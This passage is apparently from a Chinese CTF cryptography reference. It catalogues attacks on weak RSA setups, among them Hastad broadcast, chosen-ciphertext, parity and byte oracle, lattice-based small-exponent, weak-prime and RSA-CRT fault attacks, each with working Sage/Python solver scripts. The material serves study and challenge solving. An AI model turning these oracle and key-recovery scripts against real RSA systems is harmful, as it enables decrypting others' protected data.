related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = e = c1 = c2 = diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) m1 = related_message_attack(c1, c2, diff, e, n) print(&quot;m1:&quot;, m1) print(&quot;m2:&quot;, m1 + diff) 变种1： $c_i=(a_im+b_i)^e \\pmod {n_i}$ 用CRT计算系数 $T_i$ 使得 $T_i \\equiv 1 \\pmod{n_i},T_i \\equiv 0 \\pmod{n_{j \\neq i}}$， 则可建立多项式为 $f(x) = \\sum_{i} T_i [ (a_i x + b_i)^e - c_i]$，符合 $f(m) \\equiv 0 \\pmod{n_i}$， 故 $m$ 是 $f(m) \\equiv 0 \\pmod N$ 的一个根，其中 $N= \\prod_i n_i$。 如果 $m &lt; \\left (\\prod_i n_i \\right)^{1/e} = M^{1/\\deg{f(x)}}$，可以使用coppersmith找出 $m$。 参考： Security Fest 2022 - really_sick_æsthetic PlaidCTF 2017 - Multicast CakeCTF 2021 - Party Ticket ​ RSA Hastad Attack with non-linear padding and different public keys（带非线性padding和不同公钥的广播攻击）适用情况：$m$ 经 $k$ 次非线性padding处理后，分别用 $k$ 组 $(N_i,e_i)$ 加密后得 $k$ 组 $c_i$。 参考：2020年羊城杯 - Invitation 1234567891011121314151617181920212223242526272829303132333435363738394041#Sage#e=3, padding: m²+(3^431)kdef linearPaddingHastads(cArray,nArray,aArray,bArray,eArray,eps): if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == len(eArray)): for i in range(4): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) eArray[i] = Integer(eArray[i]) TArray = [-1]*4 for i in range(4): arrayToCRT = [0]*4 arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*4 for i in range(4): gArray[i] = TArray[i]*(pow(aArray[i]*x**2 + bArray[i],eArray[i]) - cArray[i]) g = sum(gArray) g = g.monic() roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(&quot;No Solutions found!&quot;) return -1 return roots else: print(&quot;Input error!&quot;)def nonLinearPadding(): eArr = [3 for i in range(4)] nArr = [] cArr = [] aArr = [1 for i in range(4)] bArr = [i * 3 ** 431 for i in [3,8,10,11]] msg = linearPaddingHastads(cArr,nArr,aArr,bArr,eArr,eps=1/20) for i in msg: print(bytes.fromhex(hex(i)[2:])) if __name__ == &#x27;__main__&#x27;: nonLinearPadding() ​ 选择明/密文攻击选择明文攻击适用情况：对输入的任意明文服务器返回 RSA 加密结果，可以通过选择明文攻击来获取 $n$。 首先发送 $2$，让服务器进行加密，返回 $c_2=2^e \\bmod n$； 继续发送 $2^2$，让服务器进行加密，返回 $c_4=4^e \\bmod n$； 不妨设 $2^e=a+bn$，有 $c_2=(a+bn) \\bmod n=a$，$c_4=(a^2+2abn+b^2n^2) \\bmod n = a^2 \\bmod n$， 所以 $c_2^2$ 和 $c_4$ 模 $n$ 同余，即 $c_2^2-c_4=kn$，同理 $c_2^3-c_8=k’n$， 一般来说 $a^2$ 比 $n$ 大，所以 $k \\neq 0$。 同理还可以构造更多的例子取他们的公因数，来更加确定地找 $n$。 123456789101112131415161718192021222324252627282930import gmpy2def get_n(): nset = [] c2 = server_encode(2) c4 = server_encode(4) c8 = server_encode(8) nset.append(c2 * c2 - c4) nset.append(c2 * c2 * c2 - c8) c3 = server_encode(3) c9 = server_encode(9) c27 = server_encode(27) nset.append(c3 * c3 - c9) nset.append(c3 * c3 * c3 - c27) c5 = server_encode(5) c25 = server_encode(25) c125 = server_encode(125) nset.append(c5 * c5 - c25) nset.append(c5 * c5 * c5 - c125) n = nset[0] for x in nset: n = gmpy2.gcd(x, n) while n % 2 == 0: n //= 2 while n % 3 == 0: n //= 3 while n % 5 == 0: n //= 5 print(&#x27;n =&#x27;, n) return n 选择密文攻击适用情况：可以构造任意密文并获得对应明文，通过选择密文攻击获得特定的明文。 假设服务器创建了密文 $c=m^e \\bmod n$，并且把 $c$ 发送给用户，用户可以发送任意密文服务器返回解密后的明文，可以通过以下方法求出 $m$： 选择任意的 $x$ 与 $n$ 互素； 计算 $y=cx^e \\bmod n$； 由于可以进行选择密文攻击，可以求得 $y$ 对应的解密结果 $z=y^d$； 则 $z=y^d=(cx^e)^d=c^dx=mx \\bmod n$，由于 $x$ 与 $n$ 互素，容易求得相应逆元，进而可以得到 $m$。 123456789101112from Crypto.Util.number import *def get_M(): X = getPrime(5) Y = (c * (X ** e)) % n Z = server_decode(Y) i = 0 while True: M = (n * i + Z) // X if &#x27;flag&#x27; in long_to_bytes(M): print(long_to_bytes(M)) break Parity Oracle AttackLSB Oracle Attack（Least Significant Bit Oracle Attack ）适用情况：可以选择密文并泄露明文的最低位（奇偶性）。 服务器会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如1表示奇数，0表示偶数。那么给定一个加密后的密文，只需要 $\\log_2n$ 次就可以知道这个密文对应的明文消息。 假设 $c=m^e \\bmod n$，第一次时，构造密文 $c \\cdot 2^e \\bmod n=(2m)^e \\bmod n$，服务器解密后得到 $2m \\bmod n$。 这里： $2m$ 是偶数，它的幂次也是偶数； $n$ 是奇数，因为它是由两个大素数相乘得到。 那么： 服务器返回奇数，即 $2m \\bmod n$ 为奇数，则说明 $2m&gt;n$，且减去了奇数个 $n$，又因为 $2m&lt;2n$，因此减去了一个 $n$，即 $\\frac{n}{2}\\leq m \\lt n$； 服务器返回偶数，则 $2m&lt;n$，即 $0 \\leq m \\lt \\frac{n}{2}$。 第二次时，构造密文 $c \\cdot 4^e \\bmod n$，服务器解密后得到 $4m \\bmod n$，判断其奇偶性可以知道 $m$ 和 $\\frac{n}{4}$ 的大小关系。 以此类推，第 $i$ 次时，构造密文 $c \\cdot 2^{ie} \\bmod n$，服务器解密后得到 $2^im \\bmod n$，判断其奇偶性可以知道 $m$ 和 $\\frac{n}{2^i}$ 的大小关系。 所以我们就有了一个二分算法，可以在 $\\log_2n$ 次内将 $m$ 的范围逼近到一个足够狭窄的空间。 假设服务器返回 b，那么可以归纳为： 1234567L = 0R = nfor i in range(1024): if b: L = (L+R) // 2 else: R = (L+R) // 2 由于此处有大量整除运算，所以最好用 decimal 库进行精确计算，否则最后结果很可能会出错。decimal.getcontext().prec 用来设定精度。 12345678910111213141516from Crypto.Util.number import *import decimaldef get_flag(): k = n.bit_length() decimal.getcontext().prec = k L = decimal.Decimal(0) R = decimal.Decimal(int(n)) for i in range(k): c = (c * pow(2, e, n)) % n recv = server_decode(c) if recv == 1: L = (L + R) // 2 else: R = (L + R) // 2 print(long_to_bytes(int((R)))) 更多信息可参考：RSA Least-Significant-Bit Oracle Attack 和 RSA least significant bit oracle attack 。 1234567891011121314151617import decimaldef oracle(): return lsb == &#x27;odd&#x27;def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for &#x27;precise enough&#x27; floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) // 2 else: lo = (lo + hi) // 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) MSB Oracle Attack（Most Significant Bit Oracle Attack ）适用情况：可以选择密文并泄露明文的最高位（奇偶性）。 假设远程提供一个解密服务，但是只返回明文的最高字节，并且明文的形式是64字节，高位用 \\x00 填充。 将加密的内容拿去解密会得到 $m$，但是回显最高位是 \\x00，构造密文 $c \\cdot 2^e$，解密会得到 $2m \\bmod n$， 不断构造密文 $c \\cdot 2^{ie}$，当最高位不是 \\x00 时，记录下值为 $x$，则说明 $mx&gt;2^{\\text{kbit}}$， 然后再相应缩小 $x$ ，可以利用二分法，比如当第一次拿到 $mx&gt;2^{\\text{kbit}}$，那么有 $m(\\frac{x}{2})&lt;2^{\\text{kbit}}$，因此新的 $x’$ 必定满足 $\\frac{x}{2} \\lt x’ \\lt x$，接着尝试 $\\frac{x+\\frac{x}{2}}{2}$ 就好。 最终可以找到一个 $X$，满足 $mX \\lt 2^{\\text{kbit}}$ 且 $m(X+1) \\gt 2^{\\text{kbit}}$，由于是整除，所以会有误差，最后的 $m$ 在 $\\frac{2^{\\text{kbit}}}{x}$ 附近。 参考：Pwnhub - pkcs4 Byte Oracle Attack适用情况：可以选择密文并泄露最后一个字节。 服务器会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，只需要 $\\log_{256}n$ 次就可以知道这个密文对应的明文消息。 这是 RSA Parity Oracle 的扩展，既然可以泄露出最后一个字节，那么按道理获取密文对应明文的次数应该可以减少。 假设 $c=m^e \\bmod n$，第一次时，构造密文 $c \\cdot 256^e \\bmod n=(256m)^e \\bmod n$，服务器解密后得到 $256m \\bmod n$。 这里： $256m$ 是偶数，它的幂次也是偶数； $n$ 是奇数，因为它是由两个大素数相乘得到。 由于 $m=c^d \\bmod n$，所以 $m \\lt n$，那么：$256m \\bmod n=256m-kn$，$(k&lt;256)$， 而且对于两个不同的 $k_1,k_2$，有：$(256m-k_1n) \\bmod 256 \\neq (256m-k_2n) \\bmod 256$， 同时 $256m-kn$ 的最后一个字节其实就是 $-kn$ 在模 $256$ 的情况下获取的。 那么，可以首先枚举出 $0 \\sim 255$ 情况下的最后一个字节，构造一个 $k$ 和最后一个字节的映射表 $\\text{M}$。 当服务器返回最后一个字节，可以根据上述构造的映射表 $\\text{M}$ 得知 $k$，即减去了 $k$ 个 $n$，即 $kn \\leq 256m \\leq (k+1)n$。 以此类推，第 $i$ 次时，构造密文 $c \\cdot 256^{ie} \\bmod n$，服务器解密后得到 $256^im \\bmod n = 256^im-kn$，即： $kn \\leq 256^im \\leq (k+1)n$， $\\frac{kn}{256^i} \\leq m \\leq \\frac{(k+1)n}{256^i}$。 那么，可以设初始范围为：$\\frac{M}{n} \\in [L_0,R_0],(L_0=0,R_0=1)$， 第 $i$ 次迭代后：$L_i=L_{i-1}+\\frac{k_i}{256^i},R_i=R_{i-1}+\\frac{k_i+1}{256^i}$。 最后一个问题是迭代的次数，由于明文的最后一个字节可以直接由服务器解密得到，那么只需要限定 $m$ 的范围至 $m_{\\text{max}}-m_{\\text{min}} \\lt 256$，即 $n(R_i-L_i)= \\frac{n}{256^i} \\lt 256$。 例如，假设 $n \\lt 2^{1024}$，由上式可得 $i \\gt 128$。 一般对于这样的 Oracle，最多需要 $\\log_{2^{\\text{bits}}}n$ 次迭代即可确定明文，其中 bits 为泄露的明文 bit 数。RSA Parity Oracle 为 1，RSA Byte Oracle 为 8。 假设服务器返回了 b，那么可以归纳为： 1234567L = 0R = 1for i in range(128): k = mab[b] L = L + k // 256**(i+1) R = L + (k+1）// 256**(i+1)M = L * n 如果不知道 $e$ 但服务器提供任意明文加密服务，可以让服务器加密 $256$，得到 $256^e \\bmod n$。 由于有大量除法运算，为保证精度，将中间过程用 Fraction 库保存为分数。 最后一字节的数据不准确要减掉，从服务器返回精确的最后一字节数据。 其实只要求出 L 下限即可，无需求出 R 上限。 1234567891011121314151617181920from Crypto.Util.number import *from fractions import Fractiondef get_flag(): map = &#123;&#125; for i in range(0, 256): map[-n * i % 256] = i cipher256 = server_encode(256) backup = c L = Fraction(0, 1) R = Fraction(1, 1) for i in range(128): c = c * cipher256 % n b = server_decode(c) k = map[b] L, R = L + Fraction(k, 256**(i+1)), L + Fraction(k+1, 256**(i+1)) m = int(L * n) print(long_to_bytes(m - m % 256 + server_decode(backup))) ​ Common Private Exponent（共私钥指数攻击，d相同）加密用同样的私钥并且私钥比较短，从而导致了加密系统被破解。 假定： $\\begin{cases} e_1d=1+k_1\\varphi(N_1) \\newline e_2d=1+k_2\\varphi(N_2) \\newline {\\vdots} \\newline e_rd=1+k_r\\varphi(N_r) \\end{cases}$ 其中，$N_1 \\lt N_2 \\lt \\cdots \\lt N_r \\lt 2N_1$。 构造格： $B_r=\\begin{bmatrix}{M}&amp;{e_1}&amp;{e_2}&amp;{\\cdots}&amp;{e_{r}}\\newline{0}&amp;{-N_1}&amp;{0}&amp;{\\cdots}&amp;{0}\\newline{0}&amp;{0}&amp;{-N_2}&amp;{\\cdots}&amp;{0}\\newline{\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\newline{0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{-N_r}\\newline\\end{bmatrix}$ 其中 $M=\\lfloor N_r^{\\frac{1}{2}} \\rfloor$。 再利用LLL算法进行规约得到 $\\vert b_1\\vert=Md$，则 $d=\\cfrac{\\vert b_1 \\vert}{M}$，从而解密密文得到明文。 使用条件： $d \\lt N_r^{\\delta_r}，\\delta_r \\lt \\cfrac{1}{2}-\\cfrac{1}{2(r+1)}-\\log_{N_r}{(6)}$ 参考： Lattice Based Attack on Common Private Exponent RSA SCTF 2020 - RSA 1234567891011121314151617181920212223###Sage###from gmpy2 import *e0=n0=c0=e1=n1=c1=e2=n2=c2=M=iroot(int(n2),int(2))[0]a=[0]*4a[0]=[M,e0,e1,e2]a[1]=[0,-n0,0,0]a[2]=[0,0,-n1,0]a[3]=[0,0,0,-n2]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])/Mprint(bytes.fromhex(hex(pow(c1,int(d),int(n1)))[2:])) ​ 多组低解密指数攻击适用情况：2-4组 $e$，且 $d$ 较小 给定2组 $g=\\gcd(p-1,q-1),\\lambda(n)=\\frac{\\varphi(n)}{g},s=1-p-q$ 且有 $ed-k\\lambda(n)=1$，得到 $edg-kn=g+ks\\quad (1)$ 设 $e_1$ 对应 $k_1$，$e_2$ 对应 $k_2$，则有 $k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\quad (2)$ 由(1)(2)有： $\\left\\{ \\begin{matrix} e_{1}d_{1}g-k_{1}n=g+k_{1}s \\newline k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1} \\newline e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s) \\end{matrix} \\right.$ 上述等式组也可表示为 $bL_2 =[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\\cdot\\left[ \\begin{matrix} n &amp; -M_{1}n &amp; 0 &amp; n^{2} \\newline 0 &amp; M_{1}e_{1} &amp; M_{2}e_{1} &amp; -e_{1}n \\newline 0 &amp; 0 &amp; -M_{2}e_{2} &amp; -e_{2}n \\newline 0 &amp; 0 &amp; 0 &amp; e_{1}e_{2} \\end{matrix} \\right] =[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})，(g+k_{1}s)(g+k_{2}s)]$ （其中 $M_{1}=n^{1/2},M_{2}=n^{1+\\alpha_{2}},d\\approx n^{\\alpha_{2}}$） 对部分参数进行上界估计，k上界近似于 $d\\approx N^{\\alpha_{2}}$, $|s|$ 上界 $\\approx N^{1/2}$，$g$ 一般相对极小 因此上面的矩阵表示 $BA=C$ 中，$C$ 的每个元的size都近似 $n^{1+2\\alpha_{2}}$，所以 $|C|\\approx 2\\cdot n^{1+2\\alpha_{2}}$ $B$ 作为格基的格中，最短向量由Minkowski Bounds知 $\\approx \\sqrt{4}\\det(B)^{1/4}\\approx 2\\cdot n^{(13/2+\\alpha_{2})/4}$ 因此只要满足 $n^{1+2\\alpha_{2}}&lt;n^{(13/2+\\alpha_{2})/4}$ 即可将问题转化为SVP（$\\alpha_{2}&lt;\\frac{5}{14}$） 12345678910111213141516171819202122232425262728 from sage.all import *import gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod( 65537, phi) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass 参考：De1CTF 2020 - easyRSA 给定3组 类似2组情况，其中 $b=[k_1k_2k_3,d_1gk_2k_3,k_1d_2gk_3,d_1d_2g^2k_3,k_1k_2d_3g,k_1d_3g,k_2d_3g,d_1d_2d_3g^3]$ $L_3=\\left[\\begin{matrix} 1-N &amp; 0 &amp; N^2 &amp; 0 &amp; 0 &amp; 0 &amp; -N^3 \\newline e_1 &amp; -e_1 &amp; -e_1N &amp; -e &amp; 0 &amp; e_1N &amp; e_1N^2 \\newline 0 &amp; e_2 &amp; -e_2N &amp; 0 &amp; e_2N &amp; 0 &amp; e_2N^2 \\newline 0 &amp; 0 &amp; e_1e_2 &amp; 0 &amp; -e_1e_2 &amp; -e_1e_2 &amp; -e_1e_2N \\newline 0 &amp; 0 &amp; 0 &amp; e_3 &amp; -e_3N &amp; -e_3N &amp; e_3N^3 \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_3 &amp; 0 &amp; -e_1e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_2e_3 &amp; -e_2e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_2e_3 \\end{matrix}\\right] \\times D$ 其中 $D={\\rm diag}(N^{3/2},N,N^{(3/2)+\\alpha_3},N^{1/2},N^{(3/2)+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3}，1)$ 参考：3kCTF - RSA Textbook 123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *import gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod( 65537, phi_) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass 给定更多组 西湖论剑 2021 - WienerStudyTwice 参考Paper Common Modulus Attacks on Small Private Exponent RSA and Some Fast Variants (in Practice) Extending Wiener’s Attack in the Presence of Many Decrypting Exponents ​ 多项式RSA在整数RSA原理基础上将多项式代入分析： 在有限域上选取两个不可约多项式 $g(p),g(q)$，$g(n)=g(p) \\cdot g(q)$，计算出 $g(n)$ 的欧拉函数 $\\varphi(g(n))=\\varphi$， 选取一个整数 $e$ 作为公钥，$e$ 与 $\\varphi$ 是互素的，那么对于明文 $g(m)$，加密过程为 $g(m)^e \\equiv g(c) \\pmod {g(n)}$， 计算私钥 $d$ 满足 $ed \\equiv 1 \\pmod \\varphi$，则 $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$， 同样考虑 $g(n)$ 与 $g(m)$ 互素，欧拉定理对于多项式亦成立， 得到 $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$，所以 $g(c)^d \\equiv g(m) \\pmod {g(n)}$。 显然RSA对于整数的体制可以适用于有限域上的多项式。 ★注意： 对于素数 $x$，$\\varphi(x)=x-1$，但是对于不可约多项式 $g(x)$，$\\varphi(g(x))=p^n-1$。（此 $p$ 为 $GF(p)$ 的模，此 $n$ 为多项式最高项次数） 原因： 由欧拉函数定义本身，欧拉函数是小于 $n$ 的所有与 $n$ 互质的数的个数。 多项式的欧拉函数则类似，表示不高于 $g(x)$ 幂级的环内所有多项式中，与 $g(x)$ 无公因式（非1）的其他多项式的个数，所以每一个不高于 $g(x)$ 幂级的环内多项式（除了它自己）均满足此条件。 1234567891011121314151617181920212223#脚本1#Sage#已知p,n,m^ep= P = PolynomialRing(Zmod(p), name = &#x27;x&#x27;)x = P.gen()e = n = c =#分解Nq1, q2 = n.factor()q1, q2 = q1[0], q2[0]#求φ，注意求法，phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)m = pow(c,d,n)#取多项式系数flag = bytes(m.coefficients())print(&quot;Flag: &quot;, flag.decode()) 1234567891011121314151617181920212223242526#脚本2#Sage#已知p=2,n,e,cp = P = PolynomialRing(GF(p), name = &#x27;x&#x27;)x = P.gen()e = n = R.&lt;a&gt; = GF(2^2049)c = []q1, q2 = n.factor()q1, q2 = q1[0], q2[0]phi = (p**q1.degree() - 1) * (p**q2.degree() - 1)assert gcd(e, phi) == 1d = inverse_mod(e, phi)ans = &#x27;&#x27;for cc in c: cc = P(R.fetch_int(cc)) m = pow(cc,d,n) m = R(P(m)).integer_representation() print(m) ans += chr(m)print(ans) 12345#Sage#x.nbits()==2^32poly = sum(e * x^i for i,e in enumerate(Integer(n).digits(2^32)))(p, _), (q, _) = poly.factor_list()p, q = p(x=2^32), q(x=2^32) 参考： 0ctf - babyrsa watevrCTF 2019 - Swedish RSA InCTF 2020 - PolyRSA Polynomial based RSA Crypto CTF2020 - Decent RSA SecurityFest CTF 2022 - small rsa ​ Weak prime factors （p具线性特征）适用情况：$p$ 满足 $ap=u_0+M_1u_1+\\cdots+M_ku_k$ 先根据 $n$ 确定 $M$ 的大小，再根据 $M$ 选取符合要求的 $k$ 和 $c$，然后构造一个格如下： $M(\\mathcal{L})=\\begin{bmatrix}{1}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k}} \\newline{0}&amp;{1}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{CM^{2k-1}} \\newline {\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}&amp;{\\vdots} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{1}&amp;{CM} \\newline {0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{0}&amp;{-CN} \\newline \\end{bmatrix}$ 用LLL算法进行格基规约，将规约后的某个向量作为多项式系数，再对多项式进行分解，即可完成对 $n$ 的分解。 参考 Factoring RSA moduli with weak prime factors N1CTF2020 - easyRSA 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from tqdm import tqdmimport gmpy2class success(Exception): passdef attack_weak_prime(basenum, exp, n): m = basenum^exp k = len(n.str(base=basenum))//(2*exp) + 1 c = gmpy2.iroot(2*k^3, int(2)) # assert c[1] == True tmp = int(c[0]) try: for c in tqdm(range(1, tmp)): amount = 2*k+1 M = Matrix(RationalField(), amount, amount) for i in range(amount): M[i, i] = 1 M[i, amount-1] = c*m^(2*k-i) M[amount-1, amount-1] = -c*n new_basis = M.LLL(delta=0.75) for j in range(amount): last_row = list(new_basis[j]) last_row[-1] = last_row[-1]//(-c) poly = sum(e * x^(k*2-i) for i,e in enumerate(last_row)) fac = poly.factor_list() if len(fac) == 2: p_poly, q_poly = fac p_coefficient = p_poly[0].list() q_coefficient = q_poly[0].list() ap = sum(m^i * j for i,j in enumerate(p_coefficient)) bq = sum(m^i * j for i,j in enumerate(q_coefficient)) p = gcd(ap, n) q = gcd(bq, n) if (p*q == n) and (p != 1) and (q != 1): raise success except: print (&#x27;n =&#x27;, n) print (&#x27;p =&#x27;, p) print (&#x27;q =&#x27;, q) print (&#x27;p*q == n ?&#x27;, bool(p*q == n))if __name__ == &#x27;__main__&#x27;: print (&#x27;[+] Weak Prime Factorization Start!&#x27;) print (&#x27;-------------------------------------------------------------------------------------------------------------------------------&#x27;) basenum, exp = (3, 66) n = 32846178930381020200488205307866106934814063650420574397058108582359767867168248452804404660617617281772163916944703994111784849810233870504925762086155249810089376194662501332106637997915467797720063431587510189901 ​ p多次幂因子适用情况：$N=p^rq$ 情形1 条件：$(N,e)$ 满足 $ex-\\varphi(N)y=z$，其中 $x$ 与 $\\lvert z \\rvert$ 为小参数。 $f(x) = ex-z \\equiv 0 \\pmod {p^{r-1}}$ 计算 $\\gcd(ex - z,N)=g$，则 $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e * x - broot = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e * root - b),n3) 情形2 条件：小 $\\lvert d_1-d_2 \\rvert$，$\\lvert d_1-d_2 \\rvert \\lt N^{\\frac{r(r-1)}{(r+1)^2}}$。 $f(x) = e_1e_2(d_1-d_2) - (e_2-e_1) \\equiv 0 \\pmod {p^{r-1}}$ 等价于 $g(x) = x-a \\equiv 0 \\pmod {p^{r-1}}$，其中 $a \\equiv (e_2-e_1)(e_1e_2)^{-1} \\pmod {N}$。 计算 $\\gcd(e_1e_2x - (e_2-e_1),N)=g$，则 $p = \\begin{cases} g^{\\frac{1}{r-1}},\\text{if } g=p^{r-1} \\newline g^{\\frac{1}{r}},\\text{if } g=p^{r} \\newline \\frac{N}{g},\\text{if } g=p^{r-1}q \\end{cases}$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(n))f = e1*e2*x - e1 + e2root = f.monic().small_roots(X=2**672,beta=0.75)[0]g = gcd(int(e1*e2*root - e1 + e2),n) 情形3 条件：$N_1=p_1^rq_1,N_2=p_2^rq_2$，小 $\\lvert p_1-p_2 \\rvert$，$\\lvert p_1-p_2 \\rvert \\lt \\cfrac{p_1}{2rq_1q_2}$。 $\\left| \\cfrac{N_2}{N_1} - \\cfrac{q_2}{q_1} \\right| = \\cfrac{q_1q_2 \\lvert p_1^r - p_2^r \\rvert}{q_1^2p_1^r} &lt; \\cfrac{1}{2q_1^2}$ 利用 $\\cfrac{N_2}{N_1}$ 的连分数展开对应的渐进分数逼近 $\\cfrac{q_2}{q_1}$。 12345678910111213cf = continued_fraction(n1/n2)fracs = cf.convergents()for xx in tqdm(fracs): q1 = xx.numerator() q2 = xx.denominator() if q1.nbits() in range(511, 513) and q2.nbits() in range(511, 513): if n1 % q1 == 0: print(q1) assert n1 % q1 == 0 p1 = int((n1 // q1)^(1/2)) p2 = int((n2 // q2)^(1/2)) assert p1^2 * q1 == n1 break 参考： New attacks on RSA with Moduli $N = p^rq$ D^3CTF 2022 - d3factor ​ RSA-CRT 错误模攻击 有明文 $m$ 经对应编码后的 $\\sigma_p = \\mu(m)^d \\bmod p, \\sigma_q = \\mu(m)^d \\bmod q$，生成RSA-CRT签名 $\\sigma = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod N$，其中参数 $\\alpha = q \\cdot (q^{-1} \\bmod p),\\beta = p \\cdot (p^{-1} \\bmod q)$。 利用错误模注入技术得到错误签名 $\\sigma’$，即 $\\sigma’ = (\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod N’$， 对生成的两种签名 $\\sigma$ 和 $\\sigma’$ 使用CRT可计算出 $v=(\\sigma_p\\cdot\\alpha + \\sigma_q\\cdot\\beta) \\bmod (N \\cdot N’)$。 针对 $l \\ge 5$ 的编码后消息进行分析，通过计算签名对 $(\\sigma,\\sigma’)$ 分解 $N$ 的攻击方法： 对所有的 $i$，计算出对应的整数 $v_i= \\text{CRT}_{N,N’}(\\sigma_i,\\sigma_i’)$，这些对应的 $v_i$ 构成 $\\mathbb{Z}^l$ 上的向量 $\\mathbf{v}=(v_1,\\cdots,v_i)$； 利用LLL定理计算出垂直于向量 $\\mathbf{v}$ 的正交格 $\\mathbf{v}^{\\perp}$ 的规约基 $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-1}$，其中所有的向量和格的分布都是在 $\\mathbb{Z}^l$ 内。通过对存在于 $\\mathbb{Z}^{1+l}$ 中的格应用LLL定理，即对如下矩阵使用LLL定理： $\\begin{pmatrix} kv_1 &amp; 1 &amp; &amp; 0 \\newline \\vdots&amp; &amp; \\ddots &amp; \\newline kv_l &amp; 0 &amp; &amp; 1 \\end{pmatrix}$ 其中 $k$ 为合适的大常量，并去除计算出来的向量的第1个元素； 前 $l-2$ 个向量 $\\mathbf{b}_1,\\cdots,\\mathbf{b}_{l-2}$ 将生成秩为 $l-2$ 的格 $L’$，再次利用LLL定理来计算出正交格 $(L’)^{\\perp}$ 的规约基 